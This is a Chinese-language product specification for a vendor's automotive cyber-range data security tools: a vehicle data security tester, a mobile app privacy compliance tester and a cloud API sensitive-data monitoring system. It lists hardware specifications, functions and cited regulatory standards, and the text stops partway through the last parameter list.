title="智能汽车网络靶场工具库-数据安全测试工具"></a>智能汽车网络靶场工具库-数据安全测试工具</h1><h2 id="总体概述-3"><a href="#总体概述-3" class="headerlink" title="总体概述"></a>总体概述</h2><p>智能汽车网络靶场数据安全测试系统可覆盖零部件、台架、整车相关的车载网络数据安全测试，这些测试覆盖数据安全、车载CAN总线、LIN总线、车载以太网等。测试依据覆盖《WP.29 R155》、《车载信息交互系统信息安全技术要求及试验方法》、《汽车网关信息安全技术要求及试验方法》、《电动汽车远程信息服务与管理系统信息安全技术要求》、《汽车信息安全通用技术要求》等</p><p>智能汽车网络靶场数据安全测试系统包含车载以太网安全测试工具、车端数据安全测试工具、APP隐私合规测试工具等。</p><h2 id="车端数据安全测试工具"><a href="#车端数据安全测试工具" class="headerlink" title="车端数据安全测试工具"></a>车端数据安全测试工具</h2><h3 id="工具概述-10"><a href="#工具概述-10" class="headerlink" title="工具概述"></a>工具概述</h3><p>车端数据安全工具以用于测试整车、车载终端和联网汽车业务系统数据的全生命周期的数据安全检测，支持整车数据跨境传输的安全测试。</p><h3 id="工具方案-10"><a href="#工具方案-10" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="硬件方案-8"><a href="#硬件方案-8" class="headerlink" title="硬件方案"></a>硬件方案</h4><p>机箱：标准上架式机箱</p><p>开关按钮：开/关机按钮1路</p><p>处理器型号：Intel I7，主频1.8GHz</p><p>内存容量：8GB</p><p>硬盘：SSD固态硬盘容量256GB</p><p>网络接口：支持1路10M/100M/1000M自适应太网口接口</p><p>车载以太网接口：支持2路10M/100M车载以太网（主从）</p><p>车载CAN/CANFD接口：数量1路</p><p>OBD接口：数量≥1路</p><p>WIFI接口：数量≥1路，支持802.11a/b/g/n协议</p><p>蓝牙接口：数量≥1路，支持经典蓝牙和低功耗蓝牙协议</p><h4 id="软件方案-10"><a href="#软件方案-10" class="headerlink" title="软件方案"></a>软件方案</h4><p>前端设计：</p><p>用户界面：设计直观、用户友好的界面，使用户能够方便地进行操作和管理。</p><p>功能模块：将各项功能划分为不同的模块，如样品管理模块、任务管理模块、系统管理模块等。</p><p>数据展示：通过图表、表格等方式展示测试结果和相关数据，以便用户进行分析和评估。</p><p>后端设计：</p><p>服务器端：搭建服务器端，用于处理前端请求、执行相应的测试任务和数据处理。</p><p>数据库：设计数据库用于存储测试对象信息、测试任务信息、测试结果数据等。</p><p>任务管理：实现任务管理功能，包括新增、编辑、删除、搜索、配置用例、开始检测和查看结果等操作。</p><p>测试功能：实现各项测试功能，如数据安全测试、数据加密测试等。</p><p>数据和日志管理：记录和管理测试过程中产生的测试数据和操作日志，以便用户查看和导出。</p><p>安全通信：在安全通信方面，我司采用了SSL的方式进行了加密通信，这是为了保障安全的进行数据传输。</p><p>数据导出和报告：</p><p>数据导出：支持将测试结果数据导出为常见格式，如CSV、Excel等，以便用户进行进一步的数据分析和处理。</p><p>报告生成：根据测试结果自动生成测试报告，包括测试概要、测试结果、修复建议等内容。</p><p>报告导出：支持将测试报告导出为PDF格式，以便用户进行存档、分享和提交给相关方。</p><p>用户权限和安全：</p><p>用户身份验证：实现用户身份验证机制，确保只有授权用户可以访问和使用工具。</p><p>用户权限管理：设置不同的用户权限，限制用户对工具的操作和访问范围。</p><p>安全性考虑：在开发过程中，注重安全性，防止潜在的安全漏洞和攻击。</p><p>扩展性和可维护性：</p><p>扩展性：设计具有良好扩展性的架构，以方便后续添加新的功能模块和测试功能。</p><p>可维护性：采用合适的编程规范和设计模式，使代码易于维护和修改。</p><h4 id="工具功能-10"><a href="#工具功能-10" class="headerlink" title="工具功能"></a>工具功能</h4><p>采集非授权测试：检测数据采集过程中的授权验证机制。</p><p>采集范围和周期测试：验证数据采集的范围和周期是否符合安全要求。</p><p>数据使用安全检测：检测数据在使用过程中的安全性，验证数据使用是否进行授权验证以及数据使用范围是否符合授权范围。</p><p>数据存储机密性检测：对数据存储环节的加密和访问控制进行测试，验证数据是否可被非法获取，验证是否存在数据泄露风险。</p><p>数据共享安全检测：验证数据在共享过程中的安全，测试共享协议和加密措施，数据出境和共享授权检测。</p><p>数据传输安全检测：验证数据在传输过程中的真实性、完整性和机密性保护。</p><p>数据安全销毁检测：确保不再需要的数据能够被安全地销毁，无法恢复。</p><p>深度内存检测：分析内存中的数据残留，检测是否有敏感信息泄露的风险。</p><p>非授权访问测试：模拟攻击场景，检测系统对非授权访问的防护能力。</p><p>数据篡改检测：验证系统对数据篡改行为的检测和防御能力。</p><p>关键文件分析：对系统中的关键文件进行安全性分析，如数据库文件、密钥文件、证书文件和系统固件。</p><p>数据库文件分析：对SQLite、Mysql等数据库进行深度分析，支持大文件（&gt;10M）的查看和编辑，确保数据库的完整性和机密性。</p><p>数据修改：提供数据修改功能，帮助修正潜在的安全风险。</p><p>编码转换：支持对数据进行base64、Unicode、Hex等编码的转换，便于数据的分析和处理。</p><p>密钥文件分析：识别和分析密钥文件的使用算法，检测证书文件的有效性和安全性。</p><p>读取、篡改、非授权测试：对关键数据的安全性进行综合测试，包括数据的读取、篡改和非授权访问等。</p><h3 id="产品彩页-18"><a href="#产品彩页-18" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e526a49a31cda2ca50a5259b8478cbda.png"></p><h3 id="工具参数-10"><a href="#工具参数-10" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLCARdm</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>机箱为标准上架式机箱；</li><li>开关按钮:开/关机按钮1路；</li><li>处理器型号：Intel I7，主频1.8GHz；</li><li>内存容量8GB；</li><li>硬盘，SSD固态硬盘容量256GB；</li><li>支持10M/100M/1000M自适应太网口接口，数量1路；</li><li>支持10M/100M车载以太网（主从），数量2路；</li><li>车载CAN/CANFD接口数量1路；</li><li>OBD接口数量1路；</li><li>WIFI接口数量1路，支持802.11a/b/g/n协议；</li><li>蓝牙接口数量1路，支持经典蓝牙和低功耗蓝牙协议；</li><li>支持整车、车载终端和联网汽车业务系统数据的全生命周期的数据安全检测，包括数据采集、数据使用、数据存储、数据共享、数据传输和数据销毁；</li><li>支持整车数据跨境传输的合规性检测；</li><li>支持提供数据读取、数据篡改、非授权访问、深度内存检测等敏感数据，数据库文件、密钥文件、证书文件、系统固件等分析检测；</li><li>支持对SQLite、Mysql数据库文件查看分析、数据修改支持数据库&gt;10M数据库文件分析查看；</li><li>支持可对常见编码进行转换如（base64、Unicode、Hex等）编码进行转换；</li><li>支持常见可识别密钥文件相关使用算法，可识别证书文件证书等信息；</li><li>支持数据传输的真实性、完整性和机密性等测试；</li><li>支持数据采集的非授权、采集范围、采集周期等测试；</li><li>支持数据存储/使用的机密性测试；</li><li>支持关键数据的读取、篡改、非授权等测试；</li><li>提供软件license和数据库三年之内免费升级。</li></ol><h2 id="APP隐私合规测试工具"><a href="#APP隐私合规测试工具" class="headerlink" title="APP隐私合规测试工具"></a>APP隐私合规测试工具</h2><h3 id="工具概述-11"><a href="#工具概述-11" class="headerlink" title="工具概述"></a>工具概述</h3><p>支持安卓、iOS和linux等平台移动应用隐私合规检测与分析的系统，产品具有操作简单、检测效率高、检测质量可靠和独立部署等特点，为各类移动应用进行全方位和深度的隐私合规检测。</p><h3 id="工具方案-11"><a href="#工具方案-11" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="硬件方案-9"><a href="#硬件方案-9" class="headerlink" title="硬件方案"></a>硬件方案</h4><p>硬件配置：</p><p>配置一台高性能服务器，具备足够的计算能力和存储空间来运行测试工具和存储相关数据，用来运行APP隐私合规测试工具。同时搭配iOS和Android两种不同的检测机，完成APP的动态监测。</p><p>配置：8核心CPU、16GB内存、1TB硬盘空间。</p><p>服务器操作系统：可根据甲方需求选择适合的操作系统，如Linux或Windows Server。</p><p>安卓APP检测机：谷歌原生系统手机，256GB存储空间能够访问root权限以便更深入的系统级检测。配备高性能处理器和足够的内存，以保证检测工具的流畅运行。。</p><p>苹果APP检测机：最新版本iOS系统手机，256GB存储空间。</p><h4 id="软件方案-11"><a href="#软件方案-11" class="headerlink" title="软件方案"></a>软件方案</h4><p>软件参数将包含以下模块：</p><p>1.用户管理：</p><p>用户管理系统是隐私合规测试工具的核心组成部分，它负责用户的认证、授权、信息管理和安全性维护。该系统允许用户通过用户名和密码进行登录，并通过多因素认证增强安全性。登录后，用户能够根据其角色和权限查看和操作特定的数据和工具功能。</p><p>用户管理系统具有严格的安全措施，包括密码加密存储、会话管理以及自动注销机制。用户活动将被记录在审计日志中，以便于跟踪和回溯操作。</p><p>2.数据检索和管理：</p><p>数据检索和管理系统提供一个直观的界面，用户可以通过多种筛选条件（如APP名称、分类、评估状态、隐私结果）快速定位所需的APP检测记录。系统支持复杂查询，并提供实时搜索结果，优化用户体验。</p><p>系统确保数据的完整性和一致性，通过定期备份和同步机制，防止数据丢失或损坏。对于数据的修改和删除操作，系统将要求二次确认，并记录详细的操作日志。</p><p>3.检测引擎：</p><p>检测引擎是该工具的核心，它将负责执行各种隐私合规性检测任务。引擎支持批量检测，自动化执行数据收集、个人信息使用、SDK分析等任务，并将结果记录下来。检测引擎能够处理大量的数据，并且能够快速适应新的检测需求。</p><p>引擎集成机器学习和自然语言处理技术，用于分析隐私政策文本，并与APP的实际数据收集行为进行对比，以评估其一致性。</p><p>4.安全和对抗措施：</p><p>安全性是隐私合规测试工具的一个重要方面。工具采用行业标准的加密技术来保护数据传输和存储。此外，对于在Android平台下的检测，工具具备绕过第三方SDK检测环境的能力，如root检测、xposed框架检测等。</p><p>对抗措施包括定期的安全审计和渗透测试，确保检测工具能够抵御最新的网络威胁。</p><h4 id="工具功能-11"><a href="#工具功能-11" class="headerlink" title="工具功能"></a>工具功能</h4><p>工具包含以下检测功能</p><p>1.自动化检测功能</p><p>自动化检测功能提供无人值守的隐私合规性评估，涵盖个人信息的获取、使用、存储、传输和泄露风险。工具将自动执行流程，从模拟用户操作到监测后台数据流，再到分析权限使用情况。它将针对每个检测项生成详细的报告，包括潜在的风险和违规行为。</p><p>自动化检测功能能够识别APP中嵌入的第三方SDK，并评估这些SDK对个人信息的处理是否符合法规要求。对于个人信息的加密传输，工具将自动识别加密协议和实施情况，确保数据在传输过程中的安全。</p><p>2.隐私政策分析</p><p>隐私政策分析是工具的另一个关键功能，它将使用自然语言处理技术来解析隐私政策文档，提取关键信息，并将这些信息与APP的实际行为进行比较。分析结果将包括隐私政策的完整性评估、描述清晰度评估，以及政策与实践之间的一致性评估。</p><p>《App违法违规收集使用个人信息行为认定方法》</p><p>《常见类型移动互联网应用程序必要个人信息范围规定》</p><p>工信部信管函〔2019〕337号</p><p>工信部信管函〔2020〕164号</p><p>《信息安全技术 个人信息安全规范》 GB/T 35273-2020</p><p>《App违法违规收集使用个人信息自评估指南》</p><p>《个人信息和重要数据出境安全评估办法》</p><p>《互联网个人信息 安全保护指引》</p><p>《网络安全实践指南-移动互联网应用基本业务功能必要信息规范》 TC260-PG- 20191A</p><p>《车联网信息服务用户个人信息保护要求(YD 3746-2020)》</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e76cb055d6a72d62a2114b4b837b1307.png"></p><p>该功能将进一步支持隐私政策中声明的权限信息分析，确保APP声明的数据收集权限与其实际使用的权限相符。如果发现不一致，工具将标记出潜在的违规风险。</p><p>3.规则审核与结果展示：</p><p>规则审核功能允许用户对隐私合规检测的规则进行审核和管理。用户可以创建、保存和分享审核规则，以及对规则进行分类和标记。工具将提供一个规则审核的历史记录，包括每次审核的详细信息和结果。</p><p>检测结果的展示结合自动化和人工检测结果，提供一个直观的仪表板，展示APP的合规性评估结果。工具将支持风险级别的可视化展示，包括高、中、低风险的区分，以及不同风险等级下的问题分析。</p><p>4.法律法规和历史趋势分析</p><p>法律法规分析功能将根据最新的法律法规内容，对APP的合规性进行全面评估。工具将提供一个更新机制，确保所有的法规分析都是基于最新的法律文本。</p><p>历史趋势分析将帮助用户了解APP隐私合规性的变化情况。工具将展示不同检测批次或版本间的合规情况比对，以及不合规业务类型的占比和热度排行。这将帮助用户识别隐私合规性的改进点和潜在的风险点。</p><p>5.报告和隐私政策支持</p><p>报告功能将允许用户导出检测结果，以PDF或其他格式提供详细的合规性评估报告。工具还将支持隐私政策的下载，包括标准模板的下载，帮助APP开发者编写和完善自己的隐私政策。</p><p>6.人工解读与修复建议</p><p>为了弥补自动化检测的局限性，工具将提供人工解读服务。专业的隐私合规分析师将根据自动化检测的结果，进行深入分析，识别问题的根源，并提供针对性的修复建议。这将确保APP开发者不仅了解自己的合规性问题，而且能够采取有效的措施进行改进。</p><h3 id="产品彩页-19"><a href="#产品彩页-19" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7eaf73cf2c71ef4574274052a68f5077.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9fb1ab868f65f4e40df9629b8fd410eb.png"></p><h3 id="工具参数-11"><a href="#工具参数-11" class="headerlink" title="工具参数"></a>工具参数</h3><ol><li>安卓APP检测机：安卓系统手机</li><li>苹果APP检测机：IOS系统手机</li><li>支持使用已有的用户信息登录、登出系统</li><li>支持基于APP名字的快速检索，也可按照应用分类、评估状态、隐私结果等进行筛选，检索内容只展示本账号管理权限下的APP的检测历史和记录、并且可以点击进行详情查看。</li><li>支持对Android系统和iOS系统上的APP及第三方SDK的检测。支持APP的类型，适用功能，适用系统，适用政策和系统类型等进行APP添加进行后续分析。</li><li>支持全自动化检测，可以按照应用的检测的需求进行信息获取与出境信息检测、应用获取的个人信息检测、应用嵌入的第三方SDK检测、应用自身获取个人信息行为检测、第三方SDK获取个人信息行为检测、个人信息出境行为检测、个人信息泄露风险分析、明文存储分析和应用权限信息分析。隐私检测协议包含不限于以下条款：<br>《App违法违规收集使用个人信息行为认定方法》<br>《常见类型移动互联网应用程序必要个人信息范围规定》<br>工信部信管函〔2019〕337号<br>工信部信管函〔2020〕164号<br>《信息安全技术 个人信息安全规范》 GB/T 35273-2020<br>《App违法违规收集使用个人信息自评估指南》<br>《个人信息和重要数据出境安全评估办法》<br>《互联网个人信息 安全保护指引》<br>《网络安全实践指南-移动互联网应用基本业务功能必要信息规范》 TC260-PG- 20191A<br>《车联网信息服务用户个人信息保护要求(YD 3746-2020)》</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e76cb055d6a72d62a2114b4b837b1307.png"></p><ol><li>支持对加密传输的个人信息进行识别和标识。</li><li>具备一定的对抗攻防能力，在Android平台下，可以绕过第三方SDK对root、xposed等常见检测环境的检测保护。</li><li>利用自然语言处理技术自动化地对隐私政策进行分析，提取其中申明的个人信息类型、权限，并能够与实际行为进行对比。可以按照隐私政策申明信息情况分析、隐私政策中申明的业务功能与个人信息分析、隐私政策申明与应用收集使用个人信息一致性分析、隐私政策申明SDK与实际嵌入SDK对比分析、隐私政策中申明的权限信息分析、隐私政策完整性评估分析和隐私政策描述不清评估分析。</li><li>应用运行时明示分析、用户权利分析等人工核验行为的分析。</li><li>支持自动化检测结果和人工检测结果结合进行问题判定和展示。</li><li>使用规则审核、保存规则审核、对外提供规则审核、收集规则审核、明示同意审核、隐私条款状态审核和用户权利审核，其中包括评估的内容，评估的方式，评估的结果和审核回放。</li><li>支持评估结果概况分析，包括高中低风险分析。</li><li>支持重点问题分析，展示重要的隐私合规评估的重要问题；</li><li>支持法律法规分析，根据法律法规的内容，评估结果进行全面评估；</li><li>支持评估历史变化展示、不合规业务类型占比展示、应用不合规率展示、应用违规问题展示和热度排行等问题。对于不同检测批次或者版本的应用进行合规情况比对，该功能能够给出应用不同版间存在的差异性对比结果</li><li>支持检测APP的报告导出。</li><li>支持隐私政策的下载，隐私政策的模版下载。</li><li>支持人工对检测报告的解读，结合分析出的问题痛点进行修复建议补充</li><li>软件license和数据库三年之内免费升级。</li></ol><h2 id="云端数据检查工具"><a href="#云端数据检查工具" class="headerlink" title="云端数据检查工具"></a>云端数据检查工具</h2><h3 id="工具概述-12"><a href="#工具概述-12" class="headerlink" title="工具概述"></a>工具概述</h3><p>通过技术手段对API 访问的数据进行持续监测评估，自动梳理API 接口中的敏感数据流并生成 API 接口与敏感数据映射，确保个人隐私数据、商业数据以及其他敏感数据进行持续监控。</p><p>通过识别各种类型的API，对API的传输内容进行还原、对其传输内容进行精细化检测来达到“谁通过什么方式的API，传输了什么类型的敏感数据”的检测效果，实现敏感信息流转可视化。</p><h3 id="工具方案-12"><a href="#工具方案-12" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="硬件方案-10"><a href="#硬件方案-10" class="headerlink" title="硬件方案"></a>硬件方案</h4><p>确保云端数据检查工具能够处理高达4Gbps的网络吞吐量，并且能够承担密集的数据处理任务，我们采用以下硬件配置：</p><p>高性能网络接口卡（NIC）：</p><p>工具将配备多个高性能10Gbps以太网端口的NIC，以支持冗余和负载均衡。NIC将支持高级网络特性，如硬件级别的流量分割和过滤，以减轻CPU的负担并提高数据包处理效率。</p><p>多核处理器：</p><p>核心服务器将配备至少两个多核处理器，每个处理器至少16核心，以确保足够的并行处理能力。这些处理器将具备高频率和大缓存，以优化运行复杂的数据处理算法和机器学习模型。</p><p>大容量内存：</p><p>至少64GB的高速RAM将被用来存储正在处理的数据和临时分析结果。这将确保即使在高负载情况下，数据检查工具也能保持响应迅速。</p><p>高速存储解决方案：</p><p>采用企业级SSD阵列，配合NVMe接口，提供极速的读写能力。至少10TB的存储空间不仅能够存放大量日志数据，还能容纳机器学习模型和临时分析文件。</p><p>硬件级RAID：</p><p>为了数据的安全性和持久性，存储将采用硬件级RAID配置。这不仅提供了数据冗余，还能提高读写性能。RAID的级别将根据实际需求选择，以平衡性能和数据保护。</p><p>可扩展性与冗余性：</p><p>服务器将设计为可扩展的架构，以便未来可以增加更多的处理能力和存储空间。此外，关键组件将采用冗余设计，如双电源和热插拔硬盘，确保系统的高可用性。</p><p>监控与管理：</p><p>服务器将包含集成的硬件监控系统，能够实时监控硬件状态并提供远程管理功能。这将极大地简化维护工作，并允许快速响应任何硬件故障。</p><h4 id="软件方案-12"><a href="#软件方案-12" class="headerlink" title="软件方案"></a>软件方案</h4><p>操作系统选择与优化：</p><p>采用专门为服务器优化的版本的Linux操作系统，CentOS或Ubuntu Server。系统进行精细调整，包括内核参数的优化、网络栈的调整以及安全性的加固，以确保能够处理高速网络流量并抵御各种网络攻击。</p><p>数据处理引擎的部署：</p><p>数据处理引擎是整个工具的核心，负责处理所有进出的数据流。Apache Kafka将作为消息队列系统，以确保高吞吐量的数据能够被有效地收集和传输。Apache Flink或Spark Streaming将用于实时数据流处理，能够快速执行复杂的数据转换、聚合和分析。</p><p>API管理平台的集成：</p><p>API管理平台是管理和监控API资产的关键。它提供API网关功能，监控API流量，并收集API使用情况的统计数据。此外，该平台还支持API的版本控制、权限管理、流量限制和API文档自动生成。</p><p>数据库系统的配置：</p><p>数据库系统负责存储和查询API元数据、敏感数据识别结果、事件日志等信息。我们将使用具有高事务处理能力的PostgreSQL数据库，同时部署NoSQL数据库如MongoDB，以支持大数据量和高速读写操作。</p><p>机器学习与模式识别的应用：</p><p>机器学习框架用于发展和部署敏感数据和威胁模式识别算法。这些算法将基于历史数据训练，以提高对新出现的威胁和敏感数据模式的识别能力。</p><p>安全组件的整合：</p><p>安全组件包括WAF和IDS，它们将作为防御的第一道屏障，保护系统免受攻击和未授权访问。WAF过滤恶意流量，而IDS监控异常行为，实时提醒系统管理员潜在的威胁。</p><p>用户界面和报告工具：</p><p>用户界面（UI）将是直观和易于使用的，允许用户轻松配置检查规则、查看实时数据流和分析结果。此外，报告工具提供丰富的可视化选项，包括图表和仪表板，以帮助用户理解数据和发现趋势。</p><h4 id="工具功能-12"><a href="#工具功能-12" class="headerlink" title="工具功能"></a>工具功能</h4><p>系统内置API识别规则，支持通过自动方式发现API资产；支持自动识别Restful、GraphQL、websocket、MQTT、gRPC、JSON-RPC、XML-RPC类型API；支持对识别API自动聚类汇聚。</p><p>系统将集成先进的API自动识别技术，通过内置的识别规则库，能够实现对网络中各种类型API的智能发现。这些API包括但不限于基于HTTP/HTTPS协议的Restful API，用于实现灵活的数据查询的GraphQL API，实现实时通讯功能的websocket API，物联网领域中常用的轻量级消息传输协议MQTT，高性能的远程过程调用RPC框架gRPC，以及基于JSON和XML的远程过程调用协议JSON-RPC和XML-RPC。这些识别规则不仅能够检测API的存在，还能对API进行分类和汇总，从而为管理员提供清晰的API资产视图。</p><p>系统支持以列表形式展示API、API所属应用、API类型等多维信息，支持以主机以及业务应用两种视角查看API资产信息。</p><p>系统提供了一个用户友好的界面，通过列表的形式，将API相关的多维信息一目了然地展示出来。管理员可以看到每个API的详细信息，包括它所属的应用程序、API类型等。此外，系统还支持两种不同的视角查看API资产：一是从主机的角度，即可以查看某个主机上的所有API；二是从业务应用的角度，即可以查看某个业务应用包含的所有API。这种多维度视图使得管理员能够更容易地理解和管理API资产。</p><p>系统内置Restful、GraphQL、websocket、MQTT、gRPC、JSON-RPC、XML-RPC类型API识别规则，支持通过升级规则库方式更新API识别规则。</p><p>系统的API识别能力建立在一套全面的规则库之上，这些规则库覆盖了当前市场上主流的API类型。随着技术的发展，新的API类型可能会出现，或者现有API的特征可能会发生变化。因此，系统支持通过规则库的升级来不断更新和增强API识别规则，确保系统的识别能力与时俱进。</p><p>系统支持通过自定义方式设置API识别规则，支持基于字符串匹配以及正则表达式匹配API自定义识别规则。</p><p>除了系统内置的API识别规则，系统还提供了强大的自定义规则设置功能。用户可以根据自己的需要，通过字符串匹配或者更为复杂的正则表达式，来创建专属的API识别规则。这为那些具有特殊API设计的环境提供了便利，使得系统能够灵活适应各种不同的应用场景。</p><p>系统以列表形式分类展示按照API风险等级进行展示，展示API所属业务应用、所在主机等信息。</p><p>安全性是API管理中的重要方面，系统将对API进行风险评估，并按照风险等级进行分类展示。这个列表不仅显示了API的风险等级，还包括了API所属的业务应用和它所在的主机等关键信息。这样的设计使得管理员能够迅速识别出高风险的API，并采取相应的安全措施。</p><p>系统内置敏感数据识别规则库，支持对流量日志进行敏感数据识别、数据打标。</p><p>系统中集成了一套敏感数据识别规则库，这些规则能够在网络流量日志中自动识别出敏感信息，并对这些数据进行标记。这一功能对于遵守数据保护法规、防止数据泄露等方面至关重要。通过这种方式，系统能够帮助企业更好地管理和保护其关键数据资产。</p><p>支持结构化、半结构化以及非结构化数据进行敏感数据识别。</p><p>系统的敏感数据识别能力不限于任何特定格式的数据。无论是结构化数据（如数据库中的表格数据）、半结构化数据（如JSON或XML文件），还是非结构化数据（如文本文件或电子邮件），系统都能够有效地识别出其中的敏感信息。这种全面的识别能力确保了系统能够适应多样化的数据环境。</p><p>支持API传输的多种类型文件内容识别，支持办公类文档（doc/docx、xls/xlsx、ppt/pptx、pdf、wps）、支持文本类文档（txt、csv、rtf），其他类（odt、odp、ofd、dps等）、图片类（JPG、JPEG、PNG、BMP、TIFF）、压缩类（RAR、ZIP、7Z、BZ2、TAR、GZIP）等。</p><p>系统支持对通过API传输的各种文件内容进行识别，这包括了常用的办公文档格式（如Word、Excel、PowerPoint、PDF等），文本文件（如TXT、CSV、RTF等），以及其他文档格式（如OpenDocument格式和中国的OFD格式）。此外，系统还能识别图片文件（如JPG、PNG等）和各种常见的压缩文件格式。这种广泛的文件内容识别能力，使得系统能够在文件传输过程中有效地监控和保护敏感信息。</p><p>支持对通过API接口传输的图片中的内容进行识别。图片类型包括但不限于webp、bmp、pcx、tif、gif、jpeg、tga、psd、png、ico、dib、ras、jp2、exr、dxf、pbm、pgm、ppm等类型。</p><p>系统不仅能够识别标准的图片文件格式，还能够处理一系列专业或较少见的格式，如webp、pcx、tiff、gif、jpeg、tga、psd等。这意味着，无论图片信息以何种形式通过API传输，系统都有能力进行内容识别，确保敏感图像数据不被未授权访问或泄露。</p><p>支持内置个人信息（包含不限于电话号码、身份证号、银行卡号信息、VIN码）、商业敏感信息（如合同、交易信息等）、金融信息、企业信息等多种敏感信息识别规则。敏感数据特征库支持在线升级和更新。</p><p>系统内置了强大的个人和商业敏感信息识别功能，能够自动检测包括电话号码、身份证号、银行卡信息、车辆识别号码（VIN码）在内的各种个人信息，以及合同、交易记录等商业敏感信息，甚至金融和企业相关数据。这些敏感数据的识别规则不是静态的，系统支持在线更新特征库，以适应不断变化的数据保护要求。</p><p>根据内置规则通过关键字识别、正则表达式、文件指纹以及语义分析等多种技术识别敏感数据，包括敏感数据所属类型、敏感数据等级、敏感数据数据量等，支持对结构化、半结构化、非结构化数据识别</p><p>系统采用多种技术手段对敏感数据进行识别，这包括基于关键字的搜索、正则表达式的模式匹配、文件指纹技术以及更为高级的语义分析技术。这些技术不仅能够识别出敏感数据，还能够确定数据的类别、评估数据的敏感程度和量化数据量。这些功能对于结构化、半结构化和非结构化数据均有效，确保了系统的广泛适用性。</p><p>支持自定义敏感信息检测功能，包括但不限于关键字、正则表达式等方式。</p><p>除了内置的敏感信息检测规则，系统还提供了高度的自定义能力。用户可以根据自己的业务需求和数据保护政策，自定义敏感信息检测规则，包括设定特定的关键字和构建复杂的正则表达式。这种灵活性使得系统能够适应不同行业和不同规模企业的需求。</p><p>支持以API维度展示事件、事件等级、API。</p><p>系统能够以API为维度，将与之相关的事件及其等级一并展示。这意味着管理员可以快速地查看到任何API相关的安全事件，以及这些事件的严重程度，从而针对性地采取响应措施。</p><p>支持以攻击者维度展示事件、事件等级、API</p><p>从攻击者的角度来看，系统可以展示与特定攻击者相关联的所有事件、这些事件的等级以及受影响的API。这有助于安全团队追踪和分析攻击者的行为模式，以及评估潜在的安全风险。</p><p>威胁事件列表中支持展示事件名称、事件等级、主机、状态、攻击路径、攻击结果、攻击源、首次发现时间、最后发现时间、持续时间、业务系统、处置状态。</p><p>在威胁事件列表中，系统提供了详尽的事件信息展示，包括事件的名称、等级、受影响的主机、当前状态、攻击路径、攻击结果、攻击源的信息、首次发现时间、最后发现时间、事件的持续时间、相关的业务系统以及事件的处置状态。这些信息的全面展示有助于安全团队迅速理解事件的全貌，并采取相应的应对措施。</p><p>支持在事件列表中查看原始告警日志，告警日志包括告警发生时间、危害等级、受害者、攻击者、攻击结果、来源区域、威胁分类、威胁名称、HTTP请求路径、HTTP状态码、应用、威胁编号。</p><p>系统允许用户在事件列表中直接查看与事件相关的原始告警日志。这些日志包含了告警的详细信息，如告警发生的时间、危害等级、受害者和攻击者的信息、攻击结果、来源区域、威胁的分类和名称、HTTP请求的具体路径和状态码、相关的应用程序以及威胁的唯一编号。这样的详细信息有助于深入分析和响应安全事件。</p><p>支持按照（最近1小时、最近24小时、最近7天、最近30天、自定义）展示威胁事件分析。</p><p>系统提供了灵活的时间选择工具，用户可以根据需要选择不同的时间范围（如最近1小时、24小时、7天、30天）或自定义时间段来分析威胁事件。这样的时间筛选功能使得用户能够根据自己的需求快速地获取到相关时间段内的安全事件分析，从而更有效地进行安全监控和风险评估。</p><h3 id="产品彩页-20"><a href="#产品彩页-20" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4205cd2c6f556660428202dfe5cb270b.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/dbee4988786a659898a624f504636e2e.png"></p><h3 id="工具参数-12"><a href="#工具参数-12" class="headerlink" title="工具参数"></a>工具参数</h3><ol><li>最大支持性能网络吞吐4Gbps</li><li>系统内置API识别规则，支持通过自动方式发现API资产；支持自动识别Restful、GraphQL、websocket、MQTT、gRPC、JSON-RPC、XML-RPC类型API；支持对识别API自动聚类汇聚。</li><li>系统支持以列表形式展示API、API所属应用、API类型等多维信息，支持以主机以及业务应用两种视角查看API资产信息。</li><li>系统内置Restful、GraphQL、websocket、MQTT、gRPC、JSON-RPC、XML-RPC类型API识别规则，支持通过升级规则库方式更新API识别规则。</li><li>系统支持通过自定义方式设置API识别规则，支持基于字符串匹配以及正则表达式匹配API自定义识别规则。</li><li>系统以列表形式分类展示按照API风险等级进行展示，展示API所属业务应用、所在主机等信息。</li><li>系统内置敏感数据识别规则库，支持对流量日志进行敏感数据识别、数据打标，</li><li>支持结构化、半结构化以及非结构化数据进行敏感数据识别。</li><li>支持API传输的多种类型文件内容识别，支持办公类文档（doc/docx、xls/xlsx、ppt/pptx、pdf、wps）、支持文本类文档（txt、csv、rtf），其他类（odt、odp、ofd、dps等）、图片类（JPG、JPEG、PNG、BMP、TIFF）、压缩类（RAR、ZIP、7Z、BZ2、TAR、GZIP）等。</li><li>支持对通过API接口传输的图片中的内容进行识别。图片类型包括webp、bmp、pcx、tif、gif、jpeg、tga、psd、png、ico、dib、ras、jp2、exr、dxf、pbm、pgm、ppm等类型</li><li>支持内置个人信息（包含不限于电话号码、身份证号、银行卡号信息、VIN码）、商业敏感信息（如合同、交易信息等）、金融信息、企业信息等多种敏感信息识别规则。敏感数据特征库支持在线升级和更新。</li><li>根据内置规则通过关键字识别、正则表达式、文件指纹以及语义分析等多种技术识别敏感数据，包括敏感数据所属类型、敏感数据等级、敏感数据数据量等，支持对结构化、半结构化、非结构化数据识别</li><li>支持自定义敏感信息检测功能，包括但不限于关键字、正则表达式等方式</li><li>支持以API维度展示事件、事件等级、API</li><li>支持以攻击者维度展示事件、事件等级、API</li><li>威胁事件列表中支持展示事件名称、事件等级、主机、状态、攻击路径、攻击结果、攻击源、首次发现时间、最后发现时间、持续时间、业务系统、处置状态</li><li>支持在事件列表中查看原始告警日志，告警日志包括告警发生时间、危害等级